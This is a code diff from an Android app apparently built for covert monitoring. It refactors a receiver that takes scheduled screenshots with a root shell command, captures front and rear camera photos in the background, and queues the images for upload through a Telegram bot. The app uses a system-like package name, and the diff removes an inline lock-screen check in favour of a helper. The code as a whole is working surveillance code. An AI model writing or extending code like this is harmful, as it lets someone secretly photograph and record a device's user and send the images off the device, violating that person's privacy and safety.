@@ -1,6 +1,6 @@
 package com.system.superiormonitor.monitor
 
-import com.system.superiormonitor.util.LogLevel
+import com.system.superiormonitor.core.LogLevel
 
 import android.app.AlarmManager
 import android.app.KeyguardManager
@@ -14,8 +14,8 @@ import android.os.PowerManager
 import android.os.SystemClock
 import com.system.superiormonitor.bot.TelegramApi
 import com.system.superiormonitor.data.PrefsManager
-import com.system.superiormonitor.util.LogCategory
-import com.system.superiormonitor.util.LogManager
+import com.system.superiormonitor.core.LogCategory
+import com.system.superiormonitor.core.LogManager
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
@@ -148,28 +148,16 @@ class SnapshotReceiver : BroadcastReceiver() {
                 var errorOutput = ""
                 var isSuccess = true
 
-                // Global Lock Screen Check: Skip scheduled captures if screen is locked or off
-                val keyguardManager = context.getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
-                val powerManager = context.getSystemService(Context.POWER_SERVICE) as PowerManager
-                val isLocked = keyguardManager.isKeyguardLocked
-                val isScreenOn = powerManager.isInteractive
-
-                if (isLocked || !isScreenOn) {
-                    LogManager.log(LogCategory.SNAPSHOTS, "$tag Capture skipped: Screen is locked or off.")
-                    return@launch
-                }
-
-                if (isSnapshot) {
-                    val result = com.topjohnwu.superuser.Shell.cmd("screencap -p ${tempFile.absolutePath} && chmod 666 ${tempFile.absolutePath}").exec()
-                    errorOutput = result.err.joinToString("\n")
-                    if (!result.isSuccess) isSuccess = false
-                } else {
-                    val facing = if (isFrontCamera) 1 else 0
-                    val success = BackgroundCamera.capture(context, facing, tempFile)
-                    if (!success) {
-                        isSuccess = false
-                        errorOutput = "Capture failed internally."
+                val type = if (isSnapshot) 0 else if (isFrontCamera) 1 else 2
+                val (success, errOut) = com.system.superiormonitor.core.CaptureHelper.performCapture(context, type, true, tempFile)
+                
+                if (!success) {
+                    if (errOut.contains("skipped/aborted")) {
+                        LogManager.log(LogCategory.SNAPSHOTS, "$tag Capture skipped: Screen is locked or off.")
+                        return@launch
                     }
+                    isSuccess = false
+                    errorOutput = errOut
                 }
 
                 if (!isSuccess || !tempFile.exists() || tempFile.length() == 0L) {
@@ -185,7 +173,6 @@ class SnapshotReceiver : BroadcastReceiver() {
                 }
 
                 val isOnline = LogManager.isTelegramApiReachable.value
-                val statusDirName = if (isOnline) "online" else "offline"
                 val dateFolderFormatter = SimpleDateFormat("dd-MM-yyyy", Locale.US)
                 val timeFormatter = SimpleDateFormat("hh-mm-a", Locale.US)
                 val currentDate = Date()
@@ -193,9 +180,15 @@ class SnapshotReceiver : BroadcastReceiver() {
                 
                 val suffix = if (isSnapshot) "_shot" else if (isFrontCamera) "_front" else "_rear"
                 val fileName = "${timeFormatter.format(currentDate)}$suffix.jpeg"
-
-                val baseFolderName = if (isSnapshot) "snapshots" else if (isFrontCamera) "camera/front" else "camera/rear"
-                val destDir = File(context.getExternalFilesDir(null), "$baseFolderName/$dateFolderName/$statusDirName")
+                
+                val baseFolderName = if (isSnapshot) "captures/screen" else if (isFrontCamera) "captures/front" else "captures/rear"
+                
+                val destDir = if (isOnline) {
+                    File(context.getExternalFilesDir(null), "$baseFolderName/temp")
+                } else {
+                    File(context.getExternalFilesDir(null), "$baseFolderName/$dateFolderName/offline")
+                }
+                
                 if (!destDir.exists()) destDir.mkdirs()
 
                 val destFile = File(destDir, fileName)
@@ -206,7 +199,8 @@ class SnapshotReceiver : BroadcastReceiver() {
                 bitmap.recycle()
                 tempFile.delete()
 
-                LogManager.log(LogCategory.SNAPSHOTS, "$tag Capture saved to $statusDirName.")
+                val statusLog = if (isOnline) "temp (online)" else "offline"
+                LogManager.log(LogCategory.SNAPSHOTS, "$tag Capture saved to $statusLog.")
 
                 if (isOnline) {
                     val uploadIntent = Intent(context, com.system.superiormonitor.bot.BotService::class.java).apply {
